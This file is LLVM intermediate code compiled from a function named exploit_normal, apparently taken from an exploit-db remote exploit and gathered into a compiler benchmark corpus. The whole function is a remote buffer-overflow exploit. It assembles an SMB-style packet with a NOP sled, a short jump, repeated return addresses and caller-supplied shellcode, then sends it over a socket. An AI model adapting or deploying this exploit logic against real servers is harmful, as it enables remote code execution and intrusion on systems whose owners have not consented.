; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_10.c_exploit_normal.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_10.c_exploit_normal.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i32, i32 }
%struct.TYPE_3__ = type { i32*, i32, i32, i32 }

@__const.exploit_normal.exploit_data = private unnamed_addr constant [61 x i8] c"\00\D0\07\0C\00\D0\07\0C\00\00\00\00\00\00\00\00\00\00\00\D0\07C\00\0C\00\14\08\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\90\00", align 16

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @exploit_normal(i32 %0, i64 %1, i8* %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [4000 x i8], align 16
  %9 = alloca [61 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  %12 = alloca %struct.TYPE_4__*, align 8
  %13 = alloca %struct.TYPE_3__*, align 8
  store i32 %0, i32* %5, align 4
  store i64 %1, i64* %6, align 8
  store i8* %2, i8** %7, align 8
  %14 = bitcast [61 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %14, i8* align 16 getelementptr inbounds ([61 x i8], [61 x i8]* @__const.exploit_normal.exploit_data, i32 0, i32 0), i64 61, i1 false)
  store i32 0, i32* %10, align 4
  %15 = load i64, i64* %6, align 8
  %16 = sub i64 %15, 144
  store i64 %16, i64* %11, align 8
  %17 = getelementptr inbounds [4000 x i8], [4000 x i8]* %8, i64 0, i64 0
  %18 = call i32 @memset(i8* %17, i32 0, i32 4000)
  %19 = getelementptr inbounds [4000 x i8], [4000 x i8]* %8, i64 0, i64 0
  %20 = bitcast i8* %19 to %struct.TYPE_4__*
  store %struct.TYPE_4__* %20, %struct.TYPE_4__** %12, align 8
  %21 = getelementptr inbounds [4000 x i8], [4000 x i8]* %8, i64 0, i64 0
  %22 = getelementptr inbounds i8, i8* %21, i64 12
  %23 = bitcast i8* %22 to %struct.TYPE_3__*
  store %struct.TYPE_3__* %23, %struct.TYPE_3__** %13, align 8
  %24 = load %struct.TYPE_4__*, %struct.TYPE_4__** %12, align 8
  %25 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %24, i32 0, i32 0
  store i32 0, i32* %25, align 4
  %26 = load %struct.TYPE_4__*, %struct.TYPE_4__** %12, align 8
  %27 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %26, i32 0, i32 1
  store i32 4, i32* %27, align 4
  %28 = call i32 @htons(i32 2096)
  %29 = load %struct.TYPE_4__*, %struct.TYPE_4__** %12, align 8
  %30 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %29, i32 0, i32 2
  store i32 %28, i32* %30, align 4
  %31 = load %struct.TYPE_3__*, %struct.TYPE_3__** %13, align 8
  %32 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %31, i32 0, i32 0
  %33 = load i32*, i32** %32, align 8
  %34 = getelementptr inbounds i32, i32* %33, i64 0
  store i32 255, i32* %34, align 4
  %35 = load %struct.TYPE_3__*, %struct.TYPE_3__** %13, align 8
  %36 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %35, i32 0, i32 0
  %37 = load i32*, i32** %36, align 8
  %38 = getelementptr inbounds i32, i32* %37, i64 1
  store i32 83, i32* %38, align 4
  %39 = load %struct.TYPE_3__*, %struct.TYPE_3__** %13, align 8
  %40 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %39, i32 0, i32 0
  %41 = load i32*, i32** %40, align 8
  %42 = getelementptr inbounds i32, i32* %41, i64 2
  store i32 77, i32* %42, align 4
  %43 = load %struct.TYPE_3__*, %struct.TYPE_3__** %13, align 8
  %44 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %43, i32 0, i32 0
  %45 = load i32*, i32** %44, align 8
  %46 = getelementptr inbounds i32, i32* %45, i64 3
  store i32 66, i32* %46, align 4
  %47 = load %struct.TYPE_3__*, %struct.TYPE_3__** %13, align 8
  %48 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %47, i32 0, i32 1
  store i32 50, i32* %48, align 8
  %49 = load %struct.TYPE_3__*, %struct.TYPE_3__** %13, align 8
  %50 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %49, i32 0, i32 2
  store i32 1, i32* %50, align 4
  %51 = load %struct.TYPE_3__*, %struct.TYPE_3__** %13, align 8
  %52 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %51, i32 0, i32 3
  store i32 100, i32* %52, align 8
  %53 = getelementptr inbounds [4000 x i8], [4000 x i8]* %8, i64 0, i64 0
  %54 = getelementptr inbounds i8, i8* %53, i64 12
  %55 = getelementptr inbounds i8, i8* %54, i64 24
  %56 = getelementptr inbounds i8, i8* %55, i64 61
  %57 = call i32 @memset(i8* %56, i32 144, i32 3000)
  %58 = getelementptr inbounds [4000 x i8], [4000 x i8]* %8, i64 0, i64 1096
  store i8 -21, i8* %58, align 8
  %59 = getelementptr inbounds [4000 x i8], [4000 x i8]* %8, i64 0, i64 1097
  store i8 112, i8* %59, align 1
  store i32 0, i32* %10, align 4
  br label %60

60:                                               ; preds = %76, %3
  %61 = load i32, i32* %10, align 4
  %62 = icmp slt i32 %61, 96
  br i1 %62, label %63, label %79

63:                                               ; preds = %60
  %64 = getelementptr inbounds [4000 x i8], [4000 x i8]* %8, i64 0, i64 0
  %65 = getelementptr inbounds i8, i8* %64, i64 1099
  %66 = load i32, i32* %10, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = call i32 (i8*, ...) @memcpy(i8* %68, i64* %11, i32 4)
  %70 = getelementptr inbounds [4000 x i8], [4000 x i8]* %8, i64 0, i64 0
  %71 = getelementptr inbounds i8, i8* %70, i64 1103
  %72 = load i32, i32* %10, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = call i32 (i8*, ...) @memcpy(i8* %74, i64* %6, i32 4)
  br label %76

76:                                               ; preds = %63
  %77 = load i32, i32* %10, align 4
  %78 = add nsw i32 %77, 8
  store i32 %78, i32* %10, align 4
  br label %60

79:                                               ; preds = %60
  %80 = getelementptr inbounds [4000 x i8], [4000 x i8]* %8, i64 0, i64 0
  %81 = getelementptr inbounds i8, i8* %80, i64 12
  %82 = getelementptr inbounds i8, i8* %81, i64 24
  %83 = getelementptr inbounds [61 x i8], [61 x i8]* %9, i64 0, i64 0
  %84 = call i32 (i8*, ...) @memcpy(i8* %82, i8* %83, i64 60)
  %85 = getelementptr inbounds [4000 x i8], [4000 x i8]* %8, i64 0, i64 0
  %86 = getelementptr inbounds i8, i8* %85, i64 1800
  %87 = load i8*, i8** %7, align 8
  %88 = load i8*, i8** %7, align 8
  %89 = call i32 @strlen(i8* %88)
  %90 = call i32 (i8*, ...) @memcpy(i8* %86, i8* %87, i32 %89)
  %91 = load i32, i32* %5, align 4
  %92 = call i32 @write_timer(i32 %91, i32 3)
  %93 = icmp eq i32 %92, 1
  br i1 %93, label %94, label %101

94:                                               ; preds = %79
  %95 = load i32, i32* %5, align 4
  %96 = getelementptr inbounds [4000 x i8], [4000 x i8]* %8, i64 0, i64 0
  %97 = call i64 @send(i32 %95, i8* %96, i32 3999, i32 0)
  %98 = icmp slt i64 %97, 0
  br i1 %98, label %99, label %100

99:                                               ; preds = %94
  store i32 -1, i32* %4, align 4
  br label %102

100:                                              ; preds = %94
  store i32 0, i32* %4, align 4
  br label %102

101:                                              ; preds = %79
  store i32 -1, i32* %4, align 4
  br label %102

102:                                              ; preds = %101, %100, %99
  %103 = load i32, i32* %4, align 4
  ret i32 %103
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @memcpy(i8*, ...) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @write_timer(i32, i32) #2

declare dso_local i64 @send(i32, i8*, i32, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
